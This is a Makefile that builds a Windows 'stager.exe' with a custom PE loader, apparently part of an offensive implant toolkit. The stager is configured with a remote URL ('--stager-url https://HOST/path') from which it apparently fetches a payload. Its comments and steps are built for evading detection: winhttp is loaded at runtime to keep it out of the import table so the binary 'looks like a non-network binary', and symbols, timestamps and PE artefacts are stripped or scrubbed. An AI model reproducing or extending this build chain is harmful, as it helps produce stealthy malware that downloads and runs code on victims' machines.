ifeq ($(OS),Windows_NT)
  MSYS2   ?= C:/msys64/mingw64
  CC      ?= $(MSYS2)/bin/gcc.exe
  STRIP   ?= $(MSYS2)/bin/strip.exe
  OBJCOPY ?= $(MSYS2)/bin/objcopy.exe
  WINDRES ?= $(MSYS2)/bin/windres.exe
  PYTHON  ?= python
  export TMP  := $(or $(TMP),$(TEMP),C:/Windows/Temp)
  export TEMP := $(TMP)
else
  CC      ?= x86_64-w64-mingw32-gcc
  STRIP   ?= x86_64-w64-mingw32-strip
  OBJCOPY ?= x86_64-w64-mingw32-objcopy
  WINDRES ?= x86_64-w64-mingw32-windres
  PYTHON  ?= python3
endif

TARGET  = stager.exe
RES_SRC = ../res/stager.rc
RES_OBJ = stager_res.o

CFLAGS = -O2 -Wall -Wextra -DNDEBUG -DWIN32_LEAN_AND_MEAN \
         -fno-ident -fno-asynchronous-unwind-tables \
         -fno-stack-protector -fno-builtin \
         -Wno-cast-function-type -nostdlib \
         -I../stub

# winhttp loaded at runtime via LoadLibraryA — NOT in LDFLAGS.
# This keeps winhttp.dll out of the IAT (stager looks like a non-network binary).
LDFLAGS = -Wl,--entry,WinMainCRTStartup \
          -Wl,-subsystem,windows \
          -Wl,--no-insert-timestamp \
          -lkernel32

SRCS = stager.c ../stub/pe_load.c

.PHONY: all clean

all: stager_cfg.h $(RES_OBJ) $(TARGET)

$(RES_OBJ): $(RES_SRC) ../res/stager.manifest
	$(WINDRES) -i $(RES_SRC) --input-format=rc -o $(RES_OBJ) --output-format=coff

$(TARGET): $(SRCS) ../stub/peb_utils.h ../stub/pe_load.h stager_cfg.h $(RES_OBJ)
	$(CC) $(CFLAGS) -o $@ $(SRCS) $(RES_OBJ) $(LDFLAGS)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	$(PYTHON) ../../agent/tools/pe_scrub.py $(TARGET)
	@echo "[ok] $(TARGET)"

stager_cfg.h:
	$(error stager_cfg.h missing -- run: python build.py --stager-url https://HOST/path)

clean:
ifeq ($(OS),Windows_NT)
	del /Q $(TARGET) $(RES_OBJ) stager_cfg.h 2>nul & exit 0
else
	rm -f $(TARGET) $(RES_OBJ) stager_cfg.h
endif
